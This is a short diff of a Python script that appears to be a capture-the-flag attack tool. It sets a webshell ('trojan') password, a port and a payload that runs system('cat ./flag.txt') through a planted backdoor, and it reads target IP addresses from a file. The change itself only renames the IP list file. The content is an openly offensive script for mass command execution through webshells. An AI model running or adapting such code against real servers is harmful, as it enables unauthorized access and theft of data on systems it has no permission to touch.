@@ -8,7 +8,7 @@ passwd="cmd"                    #木马密码
 port="81"
 payload =  {passwd: 'system(\'cat ./flag.txt\');'}
 
-ippath="ip.txt"
+ippath="config_php_passwd_cmd.txt"
 pattern = re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b")
 iptables = ""
 with open(ippath, 'r') as file_to_read:
